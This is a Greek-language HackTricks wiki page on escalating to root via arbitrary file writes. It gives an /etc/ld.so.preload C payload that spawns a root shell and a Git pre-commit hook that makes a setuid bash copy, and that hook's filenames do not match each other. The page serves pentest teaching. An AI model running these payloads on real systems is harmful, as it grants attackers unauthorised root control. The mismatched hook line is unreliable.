# Αυθαίρετη Εγγραφή Αρχείου στο Root

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

### /etc/ld.so.preload

Αυτό το αρχείο συμπεριφέρεται όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`** αλλά λειτουργεί επίσης σε **SUID δυαδικά**.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλά να προσθέσετε ένα **μονοπάτι προς μια βιβλιοθήκη που θα φορτωθεί** με κάθε εκτελούμενο δυαδικό.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Οι Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **σενάρια** που εκτελούνται σε διάφορα **συμβάντα** σε ένα αποθετήριο git όπως όταν δημιουργείται ένα commit, μια συγχώνευση... Έτσι, αν ένα **προνομιούχο σενάριο ή χρήστης** εκτελεί αυτές τις ενέργειες συχνά και είναι δυνατόν να **γράψει στον φάκελο `.git`**, αυτό μπορεί να χρησιμοποιηθεί για **ανύψωση προνομίων**.

Για παράδειγμα, είναι δυνατόν να **δημιουργηθεί ένα σενάριο** σε ένα αποθετήριο git στο **`.git/hooks`** ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Αρχεία Cron & Time

TODO

### Αρχεία Υπηρεσίας & Socket

TODO

### binfmt\_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` υποδεικνύει ποιο δυαδικό αρχείο πρέπει να εκτελέσει ποιον τύπο αρχείων. TODO: ελέγξτε τις απαιτήσεις για να εκμεταλλευτείτε αυτό για να εκτελέσετε ένα αντίστροφο κέλυφος όταν ανοίγεται ένα κοινό τύπο αρχείου. 

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
